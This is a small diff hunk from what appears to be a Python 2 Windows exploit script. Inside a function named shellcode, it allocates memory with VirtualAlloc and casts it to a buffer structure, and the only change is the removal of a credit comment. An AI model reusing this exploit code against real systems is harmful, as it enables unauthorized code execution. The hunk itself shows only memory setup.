@@ -127,7 +127,6 @@ def shellcode(pid):
     if not BufferBase:
         print "\t[-]Error allocating buffer: " + FormatError()
         sys.exit(-1)
-    ### Thanks to @TheColonial for help with this part ###
     print "[*]Return address for VirtualAlloc 0x%x" % BufferBase
     mystruct = cast(BufferBase, POINTER(BUFFER))
     mystruct.contents.ptr = BufferBase + 8
